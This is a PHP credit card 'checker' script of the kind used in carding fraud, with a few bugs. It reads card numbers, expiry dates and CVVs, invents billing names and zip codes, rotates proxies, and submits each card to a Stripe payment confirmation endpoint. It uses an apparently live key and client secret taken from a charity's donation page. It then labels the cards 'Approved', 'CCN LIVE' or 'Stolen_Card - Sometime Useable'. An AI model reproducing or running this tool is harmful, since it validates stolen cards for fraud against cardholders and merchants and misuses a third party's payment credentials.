<?php


error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
	$one = str_replace($delimiters, $delimiters[0], $string);
	$two = explode($delimiters[0], $one);
	return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];



function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}
function datosnombre(){
	$nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
	return $nombre;
}
function datosapellido(){
	$apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
	return $apellido;
}
function email($nombre){
	$email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
	return $email;
}
function proxy(){
    $proxy = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxy)-1);
    $proxy = $proxy[$myproxy];
    return $proxy;

}

$proxy = proxy();
$nombre = datosnombre();
$apellido = datosapellido();
$email = email($nombre);
$x = 5;
$zip = substr(str_shuffle("123456789"), 0, $x);
$amount = '$1,'.rand(50,99);

/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/

$url = $_POST['1'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxylist);
$proxylist = file("proxy.txt");
$proxylist = $proxylist[rand(0, count($proxylist) - 1)];
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'GET');
curl_setopt ($ch, CURLOPT_HEADER, 1);
curl_exec ($ch);
$curl_scraped_page = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_1GMwRXG5iMSUSN6UEZzPKASs/confirm');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://js.stripe.com',
'Referer: https://js.stripe.com/v3/controller-44aac09df83abf4ee45f6c096a022448.html',
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS,
  'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$nombre.'+'.$apellido.'&payment_method_data[billing_details][address][city]=San+Jose&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=1198+Redmond+Avenue&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]='.$zip.'&payment_method_data[billing_details][address][state]=&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=0c9dea3f-4692-46ed-a2ea-3b9dcafd1234&payment_method_data[muid]=dbcc9ce6-9a74-4535-9b0a-0937aa1f81d7&payment_method_data[sid]=01d73799-14a0-4676-945a-32a0e625dfe3&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F0a9bd86f%3B+stripe-js-v3%2F0a9bd86f&payment_method_data[time_on_page]=26733&payment_method_data[referrer]=https%3A%2F%2Fwww.re-cycle.org%2Fpages%2Fpayment%2Fcredit-card%2F%3Fid%3Dd28742aa-f03f-4dfe-a8f0-45db59219f9c%26mobile-wallet%3D0&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_htPxJInplZU04EsfeQKn77Vw&client_secret=pi_1GMwRXG5iMSUSN6UEZzPKASs_secret_cx4WdZyLtLWABKfOdsWdtPENr');

$result = curl_exec($ch);
curl_close($ch);
$message = trim(strip_tags(getstr($result,'"message": "','"')));
$code = trim(strip_tags(getstr($result,'"decline_code": "','"')));


if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">  CVC MATCHED *Left* </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">  CVC MATCHED *Left* </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">  CVC MATCHED *Left* </span></br>';
}
elseif(strpos($result, "Your card's security code is incorrect." )) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info">✓</span> <span class="badge badge-info">  CCN LIVE *Left* </span></br>';
}
elseif(strpos($result, "Your card's security code is invalid." )) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info">✓</span> <span class="badge badge-info">  CCN LIVE *Left* </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info">✓</span> <span class="badge badge-info">  CCN LIVE *Left* </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">  CVC MATCHED - Incorrect Zip *Left* </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info">✓</span> <span class="badge badge-info">  Stolen_Card - Sometime Useable *Left* </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info">✓</span> <span class="badge badge-info">  Lost_Card - Sometime Useable *Left* </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info">✓</span> <span class="badge badge-info">  Insufficient Funds *Left* </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">'.$lista.'</span> <span class="new badge red">✕</span> <span class="badge badge-info">  Card Expired *Left* </span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info">✓</span> <span class="badge badge-info">  Pickup Card_Card - Sometime Useable *Left* </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">'.$lista.'</span> <span class="new badge red">✕</span> <span class="badge badge-info">  Incorrect Card Number *Left* </span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">'.$lista.'</span> <span class="new badge red">✕</span> <span class="badge badge-info">  Incorrect Card Number *Left* </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">'.$lista.'</span> <span class="new badge red">✕</span> <span class="badge badge-info">  Card Declined *Left* </span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">'.$lista.'</span> <span class="new badge red">✕</span> <span class="badge badge-info">  Declined : Generic_Decline *Left* </span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">'.$lista.'</span> <span class="new badge red">✕</span> <span class="badge badge-info">  Declined : Do_Not_Honor *Left* </span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">'.$lista.'</span> <span class="new badge red">✕</span> <span class="badge badge-info">  Security Code Check : Unchecked [Proxy Dead] *Left* </span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">'.$lista.'</span> <span class="new badge red">✕</span> <span class="badge badge-info">  Security Code Check : Fail *Left* </span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">'.$lista.'</span> <span class="new badge red">✕</span> <span class="badge badge-info">  Expired Card *Left* </span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">'.$lista.'</span> <span class="new badge red">✕</span> <span class="badge badge-info">  Card Doesnt Support This Purchase *Left* </span> </br>';
}
 else {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">'.$lista.'</span> <span class="new badge red">✕</span> <span class="badge badge-info">  Dead Proxy *Left* </span> </br>';
}

curl_close($ch);
ob_flush();
// EDITED BY HAROLD EGG

?>
